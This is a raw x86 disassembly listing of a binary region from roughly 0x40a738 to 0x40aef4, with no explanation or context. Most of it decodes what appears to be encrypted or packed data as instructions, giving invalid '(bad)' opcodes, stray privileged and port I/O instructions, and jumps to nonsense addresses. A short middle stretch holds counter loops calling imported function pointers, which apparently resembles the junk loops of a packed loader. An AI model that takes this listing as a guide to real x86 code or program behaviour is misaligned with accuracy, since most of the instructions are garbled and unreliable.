  40a738:	mov    bh,0x16
  40a73a:	(bad)  
  40a73c:	retf   0xff12
  40a73f:	mov    dx,0xd155
  40a743:	int3   
  40a744:	inc    ebp
  40a745:	mov    eax,ds:0x6edcd07d
  40a74a:	inc    ebx
  40a74b:	bound  esp,QWORD PTR [esi-0x2b]
  40a74e:	fild   QWORD PTR [esi+0x7a]
  40a751:	mov    dh,0x25
  40a753:	mov    eax,ds:0xf07ac67
  40a758:	sbb    eax,0xf31862e0
  40a75d:	and    DWORD PTR [esp+ebx*4-0x61d5ccce],esi
  40a764:	pop    ds
  40a765:	rcr    DWORD PTR [eax+0x317d0c72],0x37
  40a76c:	fld    QWORD PTR [esi]
  40a76e:	mov    ebp,0xf5dca067
  40a773:	(bad)  
  40a776:	daa    
  40a777:	jns    0x40a797
  40a779:	or     al,cl
  40a77b:	jo     0xd3f0f59f
  40a781:	add    BYTE PTR [ebp*2+0x73b01bdf],0x9b
  40a789:	cmp    cl,BYTE PTR [esi-0x43]
  40a78c:	mov    ah,0x69
  40a78e:	popf   
  40a78f:	mov    eax,esi
  40a791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a792:	jb     0x40a752
  40a794:	inc    edi
  40a795:	(bad)  
  40a796:	neg    BYTE PTR [eax+0x26b23e58]
  40a79c:	(bad)  
  40a79e:	dec    edi
  40a79f:	lock dec ecx
  40a7a1:	in     eax,0xc1
  40a7a3:	loope  0x40a814
  40a7a5:	aam    0x74
  40a7a7:	cmp    DWORD PTR [edx+0x7c83e5c9],edi
  40a7ad:	(bad)  
  40a7ae:	les    esp,FWORD PTR [edi]
  40a7b0:	sbb    al,0x70
  40a7b2:	cmp    bh,dh
  40a7b4:	mov    dl,0x5d
  40a7b6:	push   0xffffffbc
  40a7b8:	scas   eax,DWORD PTR es:[edi]
  40a7b9:	cld    
  40a7ba:	outs   dx,BYTE PTR ds:[esi]
  40a7bb:	(bad)  
  40a7bc:	iret   
  40a7bd:	in     al,dx
  40a7be:	xchg   esi,eax
  40a7bf:	in     al,0x81
  40a7c1:	or     bh,BYTE PTR [esp+eax*4-0xa9a116a]
  40a7c8:	add    al,0xa5
  40a7ca:	xchg   ebx,eax
  40a7cb:	bound  ebx,QWORD PTR [edx+0x43]
  40a7ce:	xchg   ebp,esp
  40a7d0:	and    ch,BYTE PTR [ebx+ebx*4-0x4b0f0ef2]
  40a7d7:	ins    DWORD PTR es:[edi],dx
  40a7d8:	not    DWORD PTR [edx+0x73a52f7f]
  40a7de:	dec    DWORD PTR [edi+0x4b867af7]
  40a7e4:	xor    DWORD PTR [ebp-0x420d6585],0xffffffb6
  40a7eb:	jle    0x40a83b
  40a7ed:	test   cl,dh
  40a7ef:	mov    cs,WORD PTR [edi-0x21]
  40a7f2:	icebp  
  40a7f3:	xchg   ebp,eax
  40a7f4:	fs sub al,0x3a
  40a7f7:	stos   DWORD PTR es:[edi],eax
  40a7f8:	(bad)  
  40a7f9:	adc    BYTE PTR [esi+0x3c],al
  40a7fc:	lea    esi,[edx]
  40a7fe:	pop    ss
  40a7ff:	das    
  40a800:	dec    ecx
  40a801:	xor    bl,ch
  40a803:	cwde   
  40a804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a805:	or     esp,edi
  40a807:	push   ebx
  40a808:	inc    esi
  40a809:	daa    
  40a80a:	mov    eax,0x82758a6d
  40a80f:	sbb    dh,BYTE PTR [edx-0x21]
  40a812:	push   edx
  40a813:	mov    esi,0x583a32d2
  40a818:	or     DWORD PTR ds:0xff139585,edx
  40a81e:	mov    edi,0xe8a1fbb9
  40a823:	sahf   
  40a824:	in     eax,0xc5
  40a826:	mov    edi,0x8bfc27b6
  40a82b:	pushf  
  40a82c:	cmp    eax,0xd5a5777a
  40a831:	loopne 0x40a7e2
  40a833:	push   eax
  40a834:	dec    ebp
  40a835:	jne    0x40a7cb
  40a837:	mov    ch,0x4f
  40a839:	xchg   DWORD PTR [edi-0x5],eax
  40a83c:	or     al,0x92
  40a83e:	syscall 
  40a840:	scas   al,BYTE PTR es:[edi]
  40a841:	xor    ebx,eax
  40a843:	call   0xb854:0xa904faa6
  40a84a:	js     0x40a876
  40a84c:	cmp    al,0x8d
  40a84e:	inc    ebp
  40a84f:	call   0x821ceddd
  40a854:	xor    eax,0x4302dd
  40a859:	adc    ebx,DWORD PTR [edi+0x0]
  40a85c:	add    BYTE PTR [ebx+0x2581e845],cl
  40a862:	jmp    0x40eb69
  40a867:	add    BYTE PTR [eax],al
  40a869:	add    cl,ch
  40a86b:	or     eax,0x8b000000
  40a870:	sbb    eax,0x4302e9
  40a875:	inc    ebx
  40a876:	mov    DWORD PTR ds:0x4302e9,ebx
  40a87c:	cmp    DWORD PTR ds:0x4302e9,0x10
  40a883:	jae    0x40a8ac
  40a889:	cmp    DWORD PTR ds:0x4302e9,0x13
  40a890:	jne    0x40a8a1
  40a896:	push   0x42e77b
  40a89b:	call   DWORD PTR ds:0x42eabf
  40a8a1:	jmp    0x40a86f
  40a8a6:	and    DWORD PTR ds:0x4302e5,edx
  40a8ac:	mov    ecx,DWORD PTR [ebp-0x24]
  40a8af:	xor    eax,esi
  40a8b1:	add    DWORD PTR ds:0x43036b,0x2a87
  40a8bb:	add    eax,edi
  40a8bd:	sub    ebx,DWORD PTR ds:0x4302ed
  40a8c3:	mov    DWORD PTR [ecx],eax
  40a8c5:	and    DWORD PTR ds:0x42e654,0x0
  40a8cf:	jmp    0x40a8e1
  40a8d4:	mov    ebx,DWORD PTR ds:0x42e654
  40a8da:	inc    ebx
  40a8db:	mov    DWORD PTR ds:0x42e654,ebx
  40a8e1:	cmp    DWORD PTR ds:0x42e654,0x1d
  40a8e8:	jae    0x40ac77
  40a8ee:	cmp    DWORD PTR ds:0x42e654,0x11
  40a8f5:	jne    0x40a90b
  40a8fb:	push   0x2475
  40a900:	push   0x8142
  40a905:	call   DWORD PTR ds:0x42e887
  40a90b:	cmp    DWORD PTR ds:0x42e654,0x10
  40a912:	jne    0x40a925
  40a918:	mov    ebx,DWORD PTR ds:0x42e654
  40a91e:	inc    ebx
  40a91f:	mov    DWORD PTR ds:0x42e654,ebx
  40a925:	jmp    0x40a8d4
  40a92a:	jmp    0x40ac77
  40a92f:	fsubr  QWORD PTR [esi-0x17]
  40a932:	or     eax,0x6fd88969
  40a937:	pop    eax
  40a938:	or     BYTE PTR [edx-0x2aacac87],bl
  40a93e:	cmp    al,0x99
  40a940:	loope  0x40a9c0
  40a942:	jle    0x40a972
  40a944:	jge    0x40a9c4
  40a946:	jle    0x40a8e2
  40a948:	cmp    esp,DWORD PTR [edi+0x12]
  40a94b:	adc    eax,DWORD PTR [ebx+0x780ff31b]
  40a951:	push   cs
  40a952:	fwait
  40a953:	sub    DWORD PTR [ebx-0x4e],edi
  40a956:	les    eax,FWORD PTR [eax-0x5056eca1]
  40a95c:	stos   DWORD PTR es:[edi],eax
  40a95d:	sbb    ah,BYTE PTR [edi]
  40a95f:	or     eax,0xdfde3816
  40a964:	js     0x40a9b0
  40a966:	outs   dx,DWORD PTR ds:[esi]
  40a967:	std    
  40a968:	or     BYTE PTR [edi+0x56bb1587],cl
  40a96e:	add    dl,BYTE PTR [edi+ebp*8]
  40a971:	xor    eax,0x26e69d6b
  40a976:	iret   
  40a977:	(bad)  
  40a978:	add    eax,0xd0c862af
  40a97d:	int3   
  40a97e:	fild   QWORD PTR [edx+0x4cbb083f]
  40a984:	iret   
  40a985:	jle    0x40a9d9
  40a987:	lahf   
  40a988:	jge    0x40a9f7
  40a98a:	test   DWORD PTR [edx+0xfb0c642],0xd153ec7e
  40a994:	nop
  40a995:	rcl    ecx,0xe2
  40a998:	fsub   DWORD PTR [ebx-0x5a]
  40a99b:	push   ss
  40a99c:	and    ah,BYTE PTR [eax+ebx*2+0x27]
  40a9a0:	mov    esi,0x7262a1eb
  40a9a5:	mov    ecx,0xd290aaf9
  40a9aa:	xor    BYTE PTR [ecx-0x1b],bl
  40a9ad:	test   eax,0x36474d97
  40a9b2:	mov    ah,0xf
  40a9b4:	sub    al,0x14
  40a9b6:	into   
  40a9b7:	inc    ebp
  40a9b8:	call   0x966:0x7e16679f
  40a9bf:	push   edi
  40a9c0:	push   cs
  40a9c1:	xor    DWORD PTR [ebx+ecx*8-0x19bb8d7d],ecx
  40a9c8:	out    0x45,al
  40a9ca:	imul   ebx,DWORD PTR [edi-0x197e8b40]
  40a9d1:	cmp    al,0x2d
  40a9d3:	or     bh,BYTE PTR [edx+0x2b]
  40a9d6:	add    DWORD PTR [edi],0xf514a5ff
  40a9dc:	dec    edx
  40a9dd:	sub    BYTE PTR [eax-0x38450180],0x6e
  40a9e4:	adc    ah,BYTE PTR [edx]
  40a9e6:	popa   
  40a9e7:	shr    DWORD PTR [ebp-0x75],1
  40a9ea:	gs xchg ebx,eax
  40a9ec:	or     al,0x28
  40a9ee:	inc    eax
  40a9ef:	enter  0xf621,0x49
  40a9f3:	xchg   edx,eax
  40a9f4:	loop   0x40a9f7
  40a9f6:	call   FWORD PTR [eax+0x4a714202]
  40a9fc:	int3   
  40a9fd:	cmp    al,0x61
  40a9ff:	add    DWORD PTR [ebx],0xd5e9e803
  40aa05:	stos   DWORD PTR es:[edi],eax
  40aa06:	mov    eax,0xef1bde6b
  40aa0b:	add    eax,0x4decb8a0
  40aa10:	in     al,dx
  40aa11:	or     ch,BYTE PTR [eax+0x4b0fc59e]
  40aa17:	and    ebx,ecx
  40aa19:	mov    al,0x92
  40aa1b:	xor    esp,edi
  40aa1d:	xor    BYTE PTR [ecx+0x5006594],bl
  40aa23:	hlt    
  40aa24:	pop    ecx
  40aa25:	add    BYTE PTR [eax-0x33],ch
  40aa28:	ins    DWORD PTR es:[edi],dx
  40aa29:	push   ebx
  40aa2a:	xchg   ebx,eax
  40aa2b:	aam    0x7a
  40aa2d:	cmp    BYTE PTR [edx+0x39],dh
  40aa30:	iret   
  40aa31:	pop    ss
  40aa32:	shl    BYTE PTR [eax-0x7d0f3b24],0xd8
  40aa39:	or     ah,BYTE PTR [eax]
  40aa3b:	frstor [eax]
  40aa3d:	xchg   esi,eax
  40aa3e:	mov    ch,0xe8
  40aa40:	xchg   BYTE PTR [esi+edi*4+0x40],bh
  40aa44:	sub    BYTE PTR [eax-0x6b67eb11],dl
  40aa4a:	data16 into 
  40aa4c:	popa   
  40aa4d:	jbe    0x40aa67
  40aa4f:	mov    cl,0xd7
  40aa51:	adc    al,0x55
  40aa53:	sub    esi,DWORD PTR [ebx-0x54]
  40aa56:	xchg   BYTE PTR [edx+0x4],bl
  40aa59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa5a:	fwait
  40aa5b:	cmp    BYTE PTR [edi-0x5e],cl
  40aa5e:	inc    edi
  40aa5f:	mov    ah,0x8d
  40aa61:	aaa    
  40aa62:	pop    edx
  40aa63:	adc    ah,bl
  40aa65:	pop    edi
  40aa66:	pop    ebp
  40aa67:	xchg   esp,eax
  40aa68:	lea    ebp,[esi-0x54]
  40aa6b:	cmp    al,0x8c
  40aa6d:	cmp    al,0xdf
  40aa6f:	and    BYTE PTR [edi-0x260d9b1b],bh
  40aa75:	mov    esp,0x94193b35
  40aa7a:	lahf   
  40aa7b:	xor    al,0xe4
  40aa7d:	ins    DWORD PTR es:[edi],dx
  40aa7e:	xor    dh,BYTE PTR [ebx]
  40aa80:	pushf  
  40aa81:	dec    ebp
  40aa82:	test   BYTE PTR [eax+0x2],bh
  40aa85:	push   edx
  40aa86:	add    ah,ah
  40aa88:	or     dl,BYTE PTR [ecx]
  40aa8a:	jmp    0x2e08f1
  40aa8f:	(bad)  
  40aa90:	(bad)  
  40aa91:	jae    0x40aaa7
  40aa93:	imul   eax,ebp,0xffffffd9
  40aa96:	jns    0x40aab6
  40aa98:	mov    bh,0x57
  40aa9a:	in     al,0x4a
  40aa9c:	or     eax,ebx
  40aa9e:	xor    dh,BYTE PTR [ebx]
  40aaa0:	imul   esp,DWORD PTR [edi],0xffffffd6
  40aaa3:	leave  
  40aaa4:	xchg   ebx,eax
  40aaa5:	retf   
  40aaa6:	stos   DWORD PTR es:[edi],eax
  40aaa7:	cwde   
  40aaa8:	dec    ecx
  40aaa9:	mov    al,ds:0xb0729efc
  40aaae:	jecxz  0x40aa60
  40aab0:	add    DWORD PTR [eax],0x31
  40aab3:	leave  
  40aab4:	sbb    edx,DWORD PTR [ebx+0x20a9aaba]
  40aaba:	cmp    DWORD PTR [edx],0xffffff90
  40aabd:	outs   dx,DWORD PTR ds:[esi]
  40aabe:	pop    edi
  40aabf:	adc    eax,0x7bbeda
  40aac4:	mov    esp,0x1446ff3f
  40aac9:	mov    ds:0x7b47cbd0,eax
  40aace:	push   esp
  40aacf:	paddsw mm4,QWORD PTR [eax]
  40aad2:	aad    0x2b
  40aad4:	cdq    
  40aad5:	xchg   ebp,eax
  40aad6:	pop    edi
  40aad7:	xchg   ebx,eax
  40aad8:	pop    ss
  40aad9:	pop    edi
  40aada:	rcl    DWORD PTR [eax],cl
  40aadc:	xlat   BYTE PTR ds:[ebx]
  40aadd:	jns    0x40aae1
  40aadf:	xchg   ecx,eax
  40aae0:	xor    bl,0xf9
  40aae3:	sti    
  40aae4:	mov    ecx,0xc6c677a6
  40aae9:	ret    0x75c6
  40aaec:	aam    0xbd
  40aaee:	sub    eax,0x64e0a130
  40aaf3:	and    al,0xb0
  40aaf5:	das    
  40aaf6:	mov    ecx,0xef881b5d
  40aafb:	push   edi
  40aafc:	sub    al,0xd
  40aafe:	push   es
  40aaff:	or     eax,0xfb829b9
  40ab04:	les    ebp,FWORD PTR [edx-0x6d]
  40ab07:	add    al,0x86
  40ab09:	adc    edx,edx
  40ab0b:	push   0x299ff864
  40ab10:	xor    dh,BYTE PTR [esi]
  40ab12:	sbb    dl,0xf2
  40ab15:	stos   BYTE PTR es:[edi],al
  40ab16:	ins    DWORD PTR es:[edi],dx
  40ab17:	mov    al,gs:0x65ec4990
  40ab1d:	jl     0x1845fb41
  40ab23:	cmp    esi,esp
  40ab25:	fidiv  DWORD PTR [ebx+edi*2+0x1f]
  40ab29:	jmp    0x40ab91
  40ab2b:	inc    eax
  40ab2c:	xor    DWORD PTR [edx+0x2a],0x27c686f0
  40ab33:	adc    ah,BYTE PTR [eax+0x55]
  40ab36:	mov    ebx,DWORD PTR [ebp+0x39]
  40ab39:	push   ebx
  40ab3a:	sbb    eax,0xcdab768a
  40ab3f:	(bad)  
  40ab40:	dec    edi
  40ab41:	test   BYTE PTR [ecx],dl
  40ab43:	sub    bh,BYTE PTR [ebx]
  40ab45:	aaa    
  40ab46:	ja     0x40ab27
  40ab48:	lods   eax,DWORD PTR ds:[esi]
  40ab49:	leave  
  40ab4a:	sub    ecx,DWORD PTR [edi+0x7f66faad]
  40ab50:	xor    al,0xdd
  40ab52:	mov    ecx,0x9b185a00
  40ab57:	(bad)
  40ab5a:	jg     0x40ab52
  40ab5c:	scas   al,BYTE PTR es:[edi]
  40ab5d:	fwait
  40ab5e:	ins    DWORD PTR es:[edi],dx
  40ab5f:	(bad)  
  40ab60:	fcom   DWORD PTR [esi+edx*4+0x6]
  40ab64:	aam    0x25
  40ab66:	push   edi
  40ab67:	push   ss
  40ab68:	bound  esp,QWORD PTR [ecx+0x56bb6c21]
  40ab6e:	pop    eax
  40ab6f:	inc    ebx
  40ab70:	(bad)  
  40ab71:	lahf   
  40ab72:	shr    dl,0xca
  40ab75:	in     eax,dx
  40ab76:	push   esp
  40ab77:	lea    ebp,cs:0xedb22ebd
  40ab7e:	push   ecx
  40ab7f:	add    esi,DWORD PTR gs:[ebx-0x46db0c9d]
  40ab86:	add    al,0xc9
  40ab88:	popf   
  40ab89:	xchg   ebx,eax
  40ab8a:	xchg   ebx,eax
  40ab8b:	repnz adc DWORD PTR [edx],ecx
  40ab8e:	or     ecx,DWORD PTR fs:[ebx]
  40ab91:	retf   0xd96c
  40ab94:	or     eax,0xd00da63
  40ab99:	pop    esi
  40ab9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab9b:	or     edx,esp
  40ab9d:	inc    ecx
  40ab9e:	push   edi
  40ab9f:	dec    ebx
  40aba0:	jmp    0x59df:0x412cbbff
  40aba7:	pop    ss
  40aba8:	jo     0x40ab36
  40abaa:	arpl   cx,dx
  40abac:	mov    ah,0xa0
  40abae:	inc    ebp
  40abaf:	sahf   
  40abb0:	lods   eax,DWORD PTR ds:[esi]
  40abb1:	rcr    BYTE PTR [edi+0x20],cl
  40abb4:	repz inc edx
  40abb6:	inc    edx
  40abb7:	arpl   WORD PTR [ecx+eiz*1-0x7],sp
  40abbb:	push   ds
  40abbc:	lods   eax,DWORD PTR ds:[esi]
  40abbd:	mov    ecx,0x8af3c52b
  40abc3:	mov    ds:0x9d3077bd,eax
  40abc8:	ud2    
  40abca:	xchg   esi,eax
  40abcb:	mov    al,ds:0xb0ae8f35
  40abd0:	dec    ebp
  40abd1:	jb     0x40ac2e
  40abd3:	cmp    edi,esp
  40abd5:	pop    eax
  40abd6:	sub    esp,DWORD PTR [esi]
  40abd8:	outs   dx,DWORD PTR ds:[esi]
  40abd9:	jl     0x40ac59
  40abdb:	or     al,0xf5
  40abdd:	loopne 0x40abbe
  40abdf:	pushf  
  40abe0:	mov    ebp,0x6f24b842
  40abe5:	test   ah,ah
  40abe7:	mul    DWORD PTR [ecx+0x7c]
  40abea:	dec    edx
  40abeb:	mov    ecx,0x44c844e2
  40abf0:	inc    ecx
  40abf1:	fsubrp st(4),st
  40abf3:	or     BYTE PTR [edi],bh
  40abf5:	dec    edx
  40abf6:	mov    dh,0xdf
  40abf8:	push   0xffa091d3
  40abfd:	mov    ebx,0x34df778f
  40ac02:	imul   ebx,DWORD PTR [ecx],0xadaff8b
  40ac08:	fisttp DWORD PTR [edi-0x60]
  40ac0b:	inc    ebp
  40ac0c:	lds    eax,FWORD PTR cs:[eax-0x4e690057]
  40ac13:	pusha  
  40ac14:	jg     0x40ac68
  40ac16:	loope  0x40abb1
  40ac18:	das    
  40ac19:	icebp  
  40ac1a:	bound  ebx,QWORD PTR [ecx-0x3dd8e527]
  40ac20:	add    eax,0x2f7181c9
  40ac25:	hlt    
  40ac26:	out    0x90,al
  40ac28:	in     al,0x8c
  40ac2a:	inc    edi
  40ac2b:	push   DWORD PTR [edx+0x17]
  40ac2e:	mov    bh,0x29
  40ac30:	lds    edi,FWORD PTR [esi+esi*2+0x5b]
  40ac34:	or     BYTE PTR [ebp-0x38ef4508],ah
  40ac3a:	cmc    
  40ac3b:	jmp    0x40ac2a
  40ac3d:	add    edx,eax
  40ac3f:	(bad)  
  40ac40:	icebp  
  40ac41:	aad    0x3f
  40ac43:	cmp    DWORD PTR [ebp+0x47dd74db],ecx
  40ac49:	(bad)  
  40ac4a:	dec    edi
  40ac4b:	mov    eax,0xc2ebdee9
  40ac50:	jle    0x40acad
  40ac52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac53:	jmp    0x40ac5c
  40ac55:	jno    0x40ac3c
  40ac57:	pop    ss
  40ac58:	mov    cl,0xf8
  40ac5a:	mov    edx,ebp
  40ac5c:	rcl    BYTE PTR [eax+0x3e],0xe
  40ac60:	shr    BYTE PTR [ebp-0x12],1
  40ac63:	inc    ebx
  40ac64:	daa    
  40ac65:	fistp  QWORD PTR [eax-0x6a]
  40ac68:	retf   
  40ac69:	daa    
  40ac6a:	mov    edi,0xb96b7462
  40ac6f:	retf   
  40ac70:	fnsave [edx-0x17]
  40ac73:	push   edx
  40ac74:	repz add DWORD PTR [esi],0xffffffa1
  40ac78:	jl     0x40ac9c
  40ac7a:	inc    ecx
  40ac7b:	add    BYTE PTR [ebx-0x71ed0148],bh
  40ac81:	jmp    0x40afce
  40ac86:	leave  
  40ac87:	inc    edx
  40ac88:	mov    ebp,0xd1515553
  40ac8d:	inc    eax
  40ac8e:	xor    ch,ah
  40ac90:	icebp  
  40ac91:	pushf  
  40ac92:	sbb    BYTE PTR ds:0xec494a01,0x7e
  40ac99:	jle    0x40acc9
  40ac9b:	jge    0x40ad1b
  40ac9d:	jle    0x40ac6b
  40ac9f:	in     al,dx
  40aca0:	lods   al,BYTE PTR ds:[esi]
  40aca1:	jecxz  0x40ac47
  40aca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aca4:	bound  edi,QWORD PTR [esi+edx*8+0x1b1704b7]
  40acab:	shl    DWORD PTR [edi+0x293fe49f],0x20
  40acb2:	mov    edi,DWORD PTR [eax-0x41]
  40acb5:	xchg   esi,eax
  40acb6:	hlt    
  40acb7:	(bad)  
  40acb8:	movups XMMWORD PTR [edi-0x68612036],xmm1
  40acbf:	mov    edi,0x5309b948
  40acc4:	xchg   ebp,eax
  40acc5:	push   edx
  40acc6:	mov    eax,0xa8f147a0
  40accb:	pop    esi
  40accc:	bound  esp,QWORD PTR [esi+0x4a]
  40accf:	imul   edx,DWORD PTR ds:0x4da5ce35,0x72
  40acd6:	mov    al,ds:0xd4be64d
  40acdb:	cmp    eax,DWORD PTR [esi]
  40acdd:	jno    0x40ac5f
  40acdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ace0:	inc    esi
  40ace1:	xchg   esi,eax
  40ace2:	push   esp
  40ace3:	stos   BYTE PTR es:[edi],al
  40ace4:	inc    esp
  40ace5:	add    bl,BYTE PTR [eax]
  40ace7:	mov    WORD PTR [ebx+0x53ddc250],ds
  40aced:	jb     0x40ad5a
  40acef:	fidiv  WORD PTR [ebx+0x5f76c588]
  40acf5:	jne    0x40ad67
  40acf7:	shl    DWORD PTR [esi-0x7c],0xeb
  40acfb:	div    BYTE PTR [edx+0x96aca6b]
  40ad01:	fs das 
  40ad03:	mov    esi,ebx
  40ad05:	pop    ebp
  40ad06:	inc    ecx
  40ad07:	or     al,0xaa
  40ad09:	pop    ds
  40ad0a:	and    DWORD PTR [edx-0x69d4c7e2],esp
  40ad10:	test   al,0xb1
  40ad12:	ret    
  40ad13:	sbb    BYTE PTR [edi+0x38],ch
  40ad16:	inc    ebp
  40ad17:	cs inc ebx
  40ad19:	push   eax
  40ad1a:	into   
  40ad1b:	test   BYTE PTR [esi+0xf],bh
  40ad1e:	dec    ecx
  40ad1f:	call   0xd3401662
  40ad24:	sub    eax,0xb7ed1c17
  40ad29:	add    al,0xb5
  40ad2b:	jp     0x40acf0
  40ad2d:	xchg   esp,eax
  40ad2e:	mov    ah,0x36
  40ad30:	stos   DWORD PTR es:[edi],eax
  40ad31:	xchg   ebx,eax
  40ad32:	(bad)  
  40ad33:	pop    ecx
  40ad34:	push   es
  40ad35:	sbb    eax,0x8b7f9d41
  40ad3a:	mov    bh,0x7
  40ad3c:	push   eax
  40ad3d:	pop    esi
  40ad3e:	push   ds
  40ad3f:	jns    0x40ad27
  40ad41:	cmp    ebp,DWORD PTR [edi+0xc]
  40ad44:	cld    
  40ad45:	iret   
  40ad46:	imul   esi,ecx,0xe4aac923
  40ad4c:	jecxz  0x40adae
  40ad4e:	and    BYTE PTR ds:0xea7559de,bh
  40ad54:	and    dl,cl
  40ad56:	ss pusha 
  40ad58:	cmp    bh,BYTE PTR [esi+edx*8-0x300dc9f]
  40ad5f:	or     DWORD PTR [esi+eax*8+0x1e],edx
  40ad63:	dec    ebx
  40ad64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad65:	dec    edi
  40ad66:	sub    dl,BYTE PTR [edx-0x6617f213]
  40ad6c:	push   esi
  40ad6d:	ret    0x39ec
  40ad70:	sbb    al,0x11
  40ad72:	pop    esp
  40ad73:	mov    BYTE PTR [ebx+eax*1],al
  40ad76:	mov    ebx,0x3c307447
  40ad7b:	adc    ch,BYTE PTR [edi]
  40ad7d:	(bad)  
  40ad7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad7f:	addr16 jl 0x40ad71
  40ad82:	ss js  0x40ad61
  40ad85:	adc    BYTE PTR [esi],dl
  40ad87:	ja     0x40adee
  40ad89:	loopne 0x40add0
  40ad8b:	pop    esp
  40ad8c:	(bad)
  40ad90:	imul   edx,eax,0xb5acba21
  40ad96:	inc    eax
  40ad97:	push   edi
  40ad98:	out    0x8,eax
  40ad9a:	push   eax
  40ad9b:	iret   
  40ad9c:	cmp    BYTE PTR ds:0x86e38f5b,dh
  40ada2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ada3:	dec    esi
  40ada4:	(bad)  
  40ada5:	xchg   ebp,eax
  40ada6:	ror    DWORD PTR [eax+0x6f],1
  40ada9:	std    
  40adaa:	cmp    eax,0xfa6fbd5f
  40adaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adb0:	add    al,0x52
  40adb2:	lods   eax,DWORD PTR ds:[esi]
  40adb4:	adc    edi,edx
  40adb6:	daa    
  40adb7:	fisttp QWORD PTR [ebx-0x2c]
  40adba:	popa   
  40adbb:	sbb    eax,0x2a799e1c
  40adc0:	jnp    0x40ae31
  40adc2:	pop    esp
  40adc3:	adc    ecx,DWORD PTR [ecx-0x66]
  40adc6:	shl    DWORD PTR [esi],cl
  40adc8:	push   edx
  40adc9:	jmp    0xe26e:0x1d9d34e2
  40add0:	jmp    0x3813:0x4fb16629
  40add7:	sub    al,0x11
  40add9:	or     eax,0x48874af
  40adde:	mov    edi,0x72487984
  40ade3:	lock addr16 (bad) 
  40ade6:	not    ecx
  40ade8:	test   eax,0xb2fc338
  40aded:	sub    esp,DWORD PTR [edi+0x50]
  40adf0:	mov    bh,0xc5
  40adf2:	pop    ss
  40adf3:	mov    al,0x6d
  40adf5:	or     ecx,DWORD PTR [ebx+ecx*8]
  40adf8:	mov    ebp,0xa7d05aa8
  40adfd:	into   
  40adfe:	lods   al,BYTE PTR ds:[esi]
  40adff:	mov    dl,0x4e
  40ae01:	(bad)  
  40ae02:	stc    
  40ae03:	rol    DWORD PTR [esi+0x23],0xd5
  40ae07:	retf   0x20d1
  40ae0a:	mov    al,ds:0x243e4d5a
  40ae0f:	pop    ebx
  40ae10:	mov    ch,0xcf
  40ae12:	adc    BYTE PTR [ebp-0x44ca750f],ch
  40ae18:	addr16 mov esi,0x87b674f
  40ae1e:	cmp    DWORD PTR [ebx+esi*2-0x3dba7f5d],esp
  40ae25:	lods   al,BYTE PTR ds:[esi]
  40ae26:	mov    ch,0xca
  40ae28:	xchg   esi,eax
  40ae29:	test   eax,0x6963eccf
  40ae2e:	mov    ds:0x69b5dcac,eax
  40ae33:	arpl   WORD PTR [esi],di
  40ae35:	mov    ah,0x4e
  40ae37:	cmp    cl,bl
  40ae39:	pop    ebp
  40ae3a:	retf   0xc666
  40ae3d:	fwait
  40ae3e:	push   ebp
  40ae3f:	shr    BYTE PTR [ebp+edx*8+0x29dad7e4],cl
  40ae46:	xchg   ecx,eax
  40ae47:	add    BYTE PTR [edi],bl
  40ae49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae4a:	pusha  
  40ae4b:	mov    ds:0xa81f4925,al
  40ae50:	inc    edi
  40ae51:	or     eax,ebp
  40ae53:	int    0x8b
  40ae55:	ds leave 
  40ae57:	mov    ah,0xb4
  40ae59:	imul   eax,DWORD PTR [edx-0x40],0xffffffee
  40ae5d:	cmp    al,0x5c
  40ae5f:	mov    eax,ds:0xfeabf885
  40ae64:	int3   
  40ae65:	cmp    DWORD PTR [edi],edi
  40ae67:	mov    bh,0xd1
  40ae69:	push   esi
  40ae6a:	daa    
  40ae6b:	cli    
  40ae6c:	jae    0x40ae76
  40ae6e:	mov    ds:0xa754393c,eax
  40ae73:	shl    DWORD PTR [eax-0x682f2707],cl
  40ae79:	mov    cl,0x51
  40ae7b:	add    eax,0x322e68df
  40ae80:	jo     0x40ae91
  40ae82:	push   ss
  40ae83:	adc    cl,BYTE PTR [esi]
  40ae85:	xchg   ebx,eax
  40ae86:	(bad)  
  40ae87:	adc    eax,0xd68c185f
  40ae8c:	dec    ebp
  40ae8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae8e:	loope  0x40ae52
  40ae90:	mov    edx,0x7d1e9f3d
  40ae95:	mov    DWORD PTR [ebp-0x5f6b04e8],eax
  40ae9b:	sti    
  40ae9c:	xchg   edi,eax
  40ae9d:	fdivr  st(3),st
  40ae9f:	xor    edi,DWORD PTR [ecx-0x531c61e8]
  40aea5:	push   0x39
  40aea7:	jmp    ebx
  40aea9:	inc    edi
  40aeaa:	adc    al,0x77
  40aeac:	jge    0x40af24
  40aeae:	inc    BYTE PTR [esi+0x13a4e0b7]
  40aeb4:	add    edx,esi
  40aeb6:	pop    edi
  40aeb7:	imul   ecx,DWORD PTR [esi],0x16
  40aeba:	push   ebp
  40aebb:	sbb    ebp,DWORD PTR [eax-0x4bb866f]
  40aec1:	mov    esi,0x27d8bacb
  40aec6:	icebp  
  40aec7:	int    0xd2
  40aec9:	or     al,0xb
  40aecb:	not    BYTE PTR [ebx-0x28]
  40aece:	mov    cl,0x78
  40aed0:	je     0x40ae9c
  40aed2:	loope  0x40aeca
  40aed4:	ret    
  40aed5:	mov    cl,0x4b
  40aed7:	hlt    
  40aed8:	fisubr DWORD PTR [ebp-0x27e64a6b]
  40aede:	inc    eax
  40aedf:	out    dx,eax
  40aee0:	or     al,0x57
  40aee2:	adc    DWORD PTR [edi-0x48],ecx
  40aee5:	cmc    
  40aee6:	popf   
  40aee7:	test   al,0x1
  40aee9:	scas   al,BYTE PTR es:[edi]
  40aeea:	inc    esi
  40aeeb:	imul   esp,DWORD PTR [ecx+0x1d9da8ce],0x1d
  40aef2:	outs   dx,BYTE PTR ds:[esi]
  40aef3:	pusha  
  40aef4:	adc    dh,BYTE PTR [ecx-0x406f6361]
